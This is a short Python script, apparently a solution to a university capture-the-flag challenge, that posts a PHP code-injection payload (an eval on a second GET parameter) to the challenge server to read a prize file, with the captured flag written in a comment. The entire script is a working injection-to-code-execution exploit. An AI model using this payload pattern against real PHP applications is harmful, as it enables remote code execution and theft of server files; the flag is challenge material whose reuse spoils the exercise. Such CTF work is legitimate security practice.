import requests
IP = 'http://ctf99.cs.ui.ac.id:9001/'
payload = b"'.eval($_GET['p']).'"
big_payload = b"echo file_get_contents('priz3_f0R_th3_winner.txt');"   #CSCE604258{r3direct_t0_4n0ther_p4rameTer}
print(len(payload))
params = {
    'p': big_payload,
    'name': payload
}
print(params)
response = requests.post(IP, params=params)
print(response.text)
